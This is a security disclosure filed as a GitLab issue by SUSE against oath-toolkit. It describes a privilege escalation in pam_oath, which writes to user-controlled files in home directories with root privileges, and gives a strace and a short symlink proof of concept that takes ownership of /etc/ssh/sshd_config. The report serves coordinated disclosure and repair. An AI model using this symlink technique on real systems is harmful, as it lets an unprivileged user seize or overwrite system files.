

[Skip to content](#content-body)
GitLab

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Privilege escalation issue in pam\_oath with usersfile in ${HOME}

This report has already been sent to simon@josefsson.org by email on 2024-08-08.
Credits for the finding go to Fabian Vogt of SUSE Linux.

Since we did not get a reply by mail yet, the SUSE security team wants to
formally reach out to the oath-toolkit project this way.

## Coordinated Disclosure

We offer coordinated disclosure according to our
[disclosure policy](https://en.opensuse.org/openSUSE%3ASecurity_disclosure_policy).
For the coordinated disclosure process please answer
the following questions for us:

* Do you want to perform coordinated disclosure? If yes, then please
  communicate your desired coordinated release date (CRD) for publishing the
  security issue and any patches/updates. We offer to keep the issue
  private for up to 90 days (resulting in publication latest on 2024-11-06),
  but prefer to maintain shorter time frames of two to four weeks, if
  possible.

  If you don't want to perform coordinated disclosure then we will immediately
  publish all information we have on the
  [oss-security mailing list](https://www.openwall.com/lists/oss-security) and in
  our bug tracker.
* Do you acknowledge the individual findings? If so, will you assign a CVE
  identifier for the security issue? If yes, then please share the CVEs with
  us once they are assigned. Otherwise we can offer to request CVEs for you
  from the Mitre corporation.

## Issue Details (Authored by Fabian Vogt fvogt@suse.com)

One useful feature is that with [!12 (merged)](/oath-toolkit/oath-toolkit/-/merge_requests/12 "Added support for user based placeholder values in pam_oath usersfile string (v2)."),
users can manage their OTP configuration themselves by using a usersfile inside
the target user's home directory, e.g.:

```
auth required pam_oath.so usersfile=${HOME}/.pam_oath_usersfile window=20 digits=6
```

However, I noticed that pam\_oath also performs writes to it and surrounding
files:

<https://gitlab.com/oath-toolkit/oath-toolkit/-/blob/e3cb13b61dd452c903b442a7abf00a9c23d07212/liboath/usersfile.c#L498>

It looks like this in strace:

```
openat(AT_FDCWD, "/home/fabian/.pam_oath_usersfile", O_RDONLY) = 3
fstat(3, {st_mode=S_IFREG|0600, st_size=91, ...}) = 0
read(3, "HOTP/T30/6\tfabian\t-\t024b0c3de9c8"..., 4096) = 91
newfstatat(AT_FDCWD, "/etc/localtime", {st_mode=S_IFREG|0644, st_size=114, ...}, 0) = 0
umask(0177177)                          = 022
lseek(3, 0, SEEK_SET)                   = 0
openat(AT_FDCWD, "/home/fabian/.pam_oath_usersfile.lock", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 5
fcntl(5, F_SETLKW, {l_type=F_WRLCK, l_whence=SEEK_SET, l_start=0, l_len=0}) = 0
openat(AT_FDCWD, "/home/fabian/.pam_oath_usersfile.new", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
read(3, "HOTP/T30/6\tfabian\t-\t024b0c3de9c8"..., 4096) = 91
fstat(6, {st_mode=S_IFREG|0600, st_size=0, ...}) = 0
read(3, "", 4096)                       = 0
fstat(3, {st_mode=S_IFREG|0600, st_size=91, ...}) = 0
fchown(6, 1001, 1001)                   = 0
write(6, "HOTP/T30/6\tfabian\t-\t024b0c3de9c8"..., 91) = 91
fsync(6)                                = 0
close(6)                                = 0
rename("/home/fabian/.pam_oath_usersfile.new", "/home/fabian/.pam_oath_usersfile") = 0
close(5)                                = 0
unlink("/home/fabian/.pam_oath_usersfile.lock") = 0
umask(022)                              = 0177
```

All of those calls are performed with process privileges, which for PAM
authentication is typically root, so extra care needs to be taken when writing
to locations controlled by unprivileged users.

Here's a PoC that gives the user control over the host's SSH configuration by
creating a symlink that redirects open + write:

```
fabian@slemicro6:~> cat .pam_oath_usersfile
HOTP/T30/6      fabian  -       024b0c3de9c8b0dd4c6fd3a19b825dc063888bb81       900532  2024-08-08T12:09:00L

fabian@slemicro6:~> stat /etc/ssh/sshd_config
  File: /etc/ssh/sshd_config
  Size: 3727            Blocks: 8          IO Block: 4096   regular file
Device: 0,35    Inode: 6498        Links: 1
Access: (0640/-rw-r-----)  Uid: (    0/    root)   Gid: (    0/    root)
Context: unconfined_u:object_r:etc_t:s0
Access: 2024-08-08 12:28:47.768188578 +0000
Modify: 2024-08-08 12:28:47.778188578 +0000
Change: 2024-08-08 12:28:47.778188578 +0000
 Birth: 2024-08-08 12:28:47.768188578 +0000
fabian@slemicro6:~> ln -s /etc/ssh/sshd_config /home/fabian/.pam_oath_usersfile.new
< now perform a login with OTP validation >
fabian@slemicro6:~> stat /etc/ssh/sshd_config
  File: /etc/ssh/sshd_config
  Size: 91              Blocks: 8          IO Block: 4096   regular file
Device: 0,35    Inode: 6498        Links: 1
Access: (0640/-rw-r-----)  Uid: ( 1001/  fabian)   Gid: ( 1001/  fabian)
Context: unconfined_u:object_r:etc_t:s0
Access: 2024-08-08 12:29:52.228188578 +0000
Modify: 2024-08-08 12:30:37.728188578 +0000
Change: 2024-08-08 12:30:37.728188578 +0000
 Birth: 2024-08-08 12:28:47.768188578 +0000
fabian@slemicro6:~> cat .pam_oath_usersfile
HOTP/T30/6      fabian  -       024b0c3de9c8b0dd4c6fd3a19b825dc063888bb81       428534  2024-08-08T12:29:38L
```

Not only was the file overwritten with mostly user controlled content, it's
also owned by the unprivileged user now so they can perform whatever changes
they want.

Other ways for exploiting this are possible, like using the .lock file to
truncate arbitrary files or if the usersfile is not directly within ${HOME}
but in a subdirectory that could be a symlink as well.

The best option to handle this is probably to drop privileges before working
with untrusted paths, though I don't know how the implementation for that
would look like for pam\_oath.

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.

